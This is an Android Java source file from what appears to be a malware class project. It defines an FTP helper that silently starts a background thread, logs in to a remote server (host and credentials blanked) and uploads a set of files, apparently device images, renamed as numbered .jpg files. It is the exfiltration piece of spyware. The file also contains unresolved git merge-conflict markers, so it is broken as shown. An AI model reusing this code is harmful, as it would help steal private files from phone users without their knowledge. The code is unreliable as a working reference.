package com.malwareclass.malwareproject;

import android.graphics.Bitmap;
import android.util.Log;

import org.apache.commons.net.ftp.FTPClient;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

/**
 * Singleton per FTP
 */
public class FTP {

    private static FTP instance;

    // credentials
    private static final String HOST = "";
    private static final String USERNAME = "";
    private static final String PASSWORD = "";

    private static final String TAG = "FTP";

    private FTP(){}

    public static FTP getInstance(){
        if (instance == null)
            instance = new FTP();
        return instance;
    }

<<<<<<< HEAD

    public void upload(final File[] files){

        // new thread to upload files
        Thread upthread = new Thread() {
            public void run() {

                // create a ftp client using org.apache.commons
                Log.d(TAG, "Creating FTP client.");
                FTPClient client = new FTPClient();

                try {
                    // connect to a ftp server whit username e password
                    Log.d(TAG, "Connecting to FTP server");
                    client.connect(HOST, 21);
                    client.login(USERNAME, PASSWORD);
                    // set file type to upload
                    client.setFileType(FTPClient.BINARY_FILE_TYPE);

                    Log.d(TAG, "Trying to upload");
                    // TODO: new way to rename files
                    int count = 0;
                    // upload file by file
                    for (File file : files) {
                        // upload only files, not directories
                        if (file.isFile()) {
                            try (InputStream input = new FileInputStream(file)) {
                                Log.d(TAG, "Uploading " + file.getAbsolutePath());
                                // upload file
                                client.storeFile(count + ".jpg", input);
                                count++;
                            } catch (Exception e) {
                                // TODO
                                Log.d(TAG, "exception " + e.getMessage());
                            }
                        }
                    }
                    Log.d(TAG, "Upload ended");

                    Log.d(TAG, "Disconetting from server");
                    // disconnect from server
                    client.disconnect();

                } catch (Exception e) {
                    // TODO
                    e.printStackTrace();
                }
                Log.d(TAG, "Ending thread");
            }
        };
        upthread.start();
=======
    public void upload(){
        //TODO quanti ne servono???  non lo so
>>>>>>> Valentina
    }
}